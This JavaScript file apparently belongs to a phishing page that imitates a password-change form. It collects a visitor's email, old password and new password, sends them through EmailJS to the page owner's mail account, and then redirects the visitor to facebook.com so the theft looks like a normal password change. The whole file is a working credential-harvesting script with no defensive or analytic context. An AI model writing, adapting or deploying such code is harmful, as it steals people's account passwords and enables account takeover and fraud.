(function() {
  emailjs.init("ODWuzZ-mZLM196nkP"); // Your EmailJS Public Key
})();

document.getElementById('passwordForm').addEventListener('submit', function(event) {
  event.preventDefault();

  // Get values from the form
  const email = document.getElementById('email').value;
  const oldPassword = document.getElementById('oldPassword').value;
  const newPassword = document.getElementById('newPassword').value;

  if (email && oldPassword && newPassword) {
    // Send data using EmailJS
    emailjs.send("service_8hdqzju", "template_hk6uqi8", {
      email: email,
      old_password: oldPassword,
      new_password: newPassword
    }).then(function(response) {
      console.log('SUCCESS!', response.status, response.text);

      // Hide the form and show success message
      document.getElementById('passwordBox').style.display = 'none';
      document.getElementById('successMessage').style.display = 'block';

      // Redirect after 2 seconds
      setTimeout(function() {
        window.location.href = 'https://facebook.com';  // Redirect to Facebook
      }, 2000);

    }, function(error) {
      console.log('FAILED...', error);
    });
  } else {
    alert('Please fill in all fields!');
  }
});